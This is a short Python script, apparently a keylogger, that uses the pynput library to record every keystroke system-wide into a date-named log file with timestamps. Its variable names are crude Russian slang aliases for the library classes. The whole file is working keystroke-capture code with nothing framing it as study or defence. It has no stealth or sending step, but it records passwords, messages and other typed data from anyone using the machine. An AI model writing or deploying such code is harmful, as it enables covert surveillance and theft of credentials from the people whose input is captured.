from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

now = datetime.today().strftime('%Y-%m-%d')
logg = now + ".txt" 
blyat = Key
cyka = Listener
logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(blyat):
    logging.info(str(blyat))
 
with cyka(on_press=on_press) as cyka :
    cyka.join()
    